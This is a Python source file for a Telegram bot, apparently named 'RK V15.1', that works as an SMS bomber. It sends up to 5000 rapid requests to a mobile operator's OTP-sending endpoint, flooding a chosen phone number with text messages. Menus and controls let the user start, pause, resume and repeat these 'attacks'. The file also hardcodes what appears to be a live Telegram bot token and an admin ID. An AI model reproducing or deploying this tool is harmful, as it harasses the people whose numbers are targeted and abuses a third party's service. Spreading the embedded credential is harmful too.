import asyncio
import aiohttp
import telebot
import time
import datetime
import pytz
import psutil
import json
import os
import logging
import random
import sys
import traceback
from telebot.async_telebot import AsyncTeleBot
from telebot import types
# Render এ পোর্ট বাইন্ড করার জন্য
from aiohttp import web 

# --- CONFIGURATION ---
API_TOKEN = '8479817459:AAEgiLY2rnRuzsgCbD91nTzCdDMTaM_vOAs'
ADMIN_ID = 6048050987  
TARGET_URL = "https://da-api.robi.com.bd/da-nll/otp/send"
WAKEUP_URL = "https://rk-bombx.onrender.com" # আপনার দেওয়া লিংক
DB_FILE = "rk_users_v15.json"
HISTORY_FILE = "rk_history_v15.json"
SYSTEM_STATS_FILE = "rk_system_stats.json"

bot = AsyncTeleBot(API_TOKEN)

# Global Variables
active_attacks = {}  
user_states = {}
authorized_users = {ADMIN_ID}
attack_history = []
global_sms_count = 0

# --- RENDER WAKEUP LOGIC ---
async def keep_alive():
    """বটকে সচল রাখতে নির্দিষ্ট সময় পর পর নিজেকে পিং করবে।"""
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.get(WAKEUP_URL) as resp:
                    logging.info(f"Wakeup pulse sent to {WAKEUP_URL}, Status: {resp.status}")
            except Exception as e:
                logging.error(f"Wakeup failed: {e}")
            await asyncio.sleep(300) # ৫ মিনিট পর পর

# --- HEALTH CHECK SERVER (For Render Deployment) ---
async def handle_health_check(request):
    return web.Response(text="Bot is running smoothly! 🚀")

async def start_health_server():
    app = web.Application()
    app.router.add_get('/', handle_health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    # Render সাধারণত $PORT এনভায়রনমেন্ট ভ্যারিয়েবল ব্যবহার করে
    port = int(os.environ.get("PORT", 80180))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    logging.info(f"Health server started on port {port}")

# --- DATA PERSISTENCE ---
def load_all_data():
    global authorized_users, attack_history, global_sms_count
    try:
        if os.path.exists(DB_FILE):
            with open(DB_FILE, "r") as f: authorized_users = set(json.load(f))
        if os.path.exists(HISTORY_FILE):
            with open(HISTORY_FILE, "r") as f: attack_history = json.load(f)
        if os.path.exists(SYSTEM_STATS_FILE):
            with open(SYSTEM_STATS_FILE, "r") as f:
                stats = json.load(f)
                global_sms_count = stats.get("total_sent", 0)
    except Exception as e:
        logging.error(f"Data loading error: {e}")

def save_data():
    try:
        with open(DB_FILE, "w") as f: json.dump(list(authorized_users), f, indent=4)
        with open(HISTORY_FILE, "w") as f: json.dump(attack_history[-100:], f, indent=4)
        with open(SYSTEM_STATS_FILE, "w") as f: json.dump({"total_sent": global_sms_count}, f, indent=4)
    except Exception as e:
        logging.error(f"Data saving error: {e}")

# --- UI HELPERS ---
def get_main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🚀 Start Attack", "📜 Attack History", "⏳ Running List", "💎 My Status", "📊 System Info", "📞 Support")
    return markup

def get_control_panel(chat_id, status, target=None):
    markup = types.InlineKeyboardMarkup(row_width=2)
    p_text = "⏸ Pause" if status == "running" else "▶️ Resume"
    p_callback = f"pau_{chat_id}" if status == "running" else f"res_{chat_id}"
    markup.add(types.InlineKeyboardButton(p_text, callback_data=p_callback),
               types.InlineKeyboardButton("⏹ Stop", callback_data=f"stp_{chat_id}"))
    if status == "completed" and target:
        markup.add(types.InlineKeyboardButton("🔄 Re-Attack", callback_data=f"re_{target}"))
    return markup

# --- ENGINE ---
async def perform_sms(session, number, stats):
    global global_sms_count
    try:
        async with session.post(TARGET_URL, json={"msisdn": number}, timeout=10) as resp:
            if resp.status == 200:
                stats['ok'] += 1
                global_sms_count += 1
            else: stats['err'] += 1
    except: stats['err'] += 1
    stats['total'] += 1

async def attack_orchestrator(chat_id, message_id, target, limit):
    evt = asyncio.Event()
    evt.set()
    active_attacks[chat_id] = {'event': evt, 'status': 'running', 'stop': False, 'target': target}
    
    stats = {'ok': 0, 'err': 0, 'total': 0}
    start_ts = time.time()
    
    

    async with aiohttp.ClientSession() as session:
        while stats['total'] < limit:
            if active_attacks.get(chat_id, {}).get('stop'): break
            if not evt.is_set(): await evt.wait()
            
            batch = min(15, limit - stats['total'])
            tasks = [perform_sms(session, target, stats) for _ in range(batch)]
            await asyncio.gather(*tasks)
            
            # UI Update
            try:
                prog = int((stats['total']/limit)*100)
                bar = "🔹"*(prog//10) + "▫️"*(10-(prog//10))
                txt = (f"🔥 **RK ATTACK LIVE** 🔥\n━━━━━━━━━━━━━━\n📱 Target: `{target}`\n"
                       f"📊 Progress: `{prog}%` | {bar}\n✅ Success: `{stats['ok']}` | ❌ Fail: `{stats['err']}`\n"
                       f"📡 Status: `{active_attacks[chat_id]['status'].upper()}`")
                await bot.edit_message_text(txt, chat_id, message_id, 
                                          reply_markup=get_control_panel(chat_id, active_attacks[chat_id]['status']))
            except: pass
            await asyncio.sleep(1.5)

    active_attacks[chat_id]['status'] = 'completed'
    save_data()
    await bot.send_message(chat_id, f"🏁 **Attack Completed!**\nTarget: `{target}`\nSuccess: `{stats['ok']}`", 
                           reply_markup=get_control_panel(chat_id, "completed", target))
    active_attacks.pop(chat_id, None)

# --- HANDLERS ---
@bot.message_handler(commands=['start'])
async def start(m):
    await bot.send_message(m.chat.id, "🚀 **RK V15.1 READY**", reply_markup=get_main_menu())

@bot.message_handler(func=lambda m: m.text == "🚀 Start Attack")
async def ask_num(m):
    if m.chat.id not in authorized_users: return await bot.reply_to(m, "❌ No Access!")
    user_states[m.chat.id] = "num"
    await bot.send_message(m.chat.id, "📞 নম্বর দিন:", reply_markup=types.ReplyKeyboardRemove())

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "num")
async def get_num(m):
    if len(m.text) == 11 and m.text.isdigit():
        user_states[m.chat.id] = {"target": m.text, "state": "limit"}
        await bot.send_message(m.chat.id, "🔢 পরিমাণ দিন (Max 5000):")
    else: await bot.reply_to(m, "❌ ভুল নম্বর!")

@bot.message_handler(func=lambda m: isinstance(user_states.get(m.chat.id), dict) and user_states[m.chat.id].get("state") == "limit")
async def get_lim(m):
    try:
        limit = min(int(m.text), 5000)
        target = user_states[m.chat.id]['target']
        user_states.pop(m.chat.id)
        msg = await bot.send_message(m.chat.id, "⚙️ ইঞ্জিন শুরু হচ্ছে...")
        asyncio.create_task(attack_orchestrator(m.chat.id, msg.message_id, target, limit))
    except: await bot.reply_to(m, "❌ সংখ্যা দিন!")

@bot.callback_query_handler(func=lambda c: True)
async def cb(c):
    cid = c.message.chat.id
    if c.data.startswith("pau_"):
        if cid in active_attacks:
            active_attacks[cid]['event'].clear()
            active_attacks[cid]['status'] = "paused"
            await bot.answer_callback_query(c.id, "Paused ⏸")
    elif c.data.startswith("res_"):
        if cid in active_attacks:
            active_attacks[cid]['event'].set()
            active_attacks[cid]['status'] = "running"
            await bot.answer_callback_query(c.id, "Resumed ▶️")
    elif c.data.startswith("stp_"):
        if cid in active_attacks:
            active_attacks[cid]['stop'] = True
            active_attacks[cid]['event'].set()
            await bot.answer_callback_query(c.id, "Stopped ⏹")

# --- MAIN RUNNER ---
async def run():
    load_all_data()
    # এক সাথে হেলথ সার্ভার, ওয়েকআপ এবং বট চালানো
    await asyncio.gather(
        start_health_server(),
        keep_alive(),
        bot.polling(non_stop=True)
    )

if __name__ == "__main__":
    asyncio.run(run())
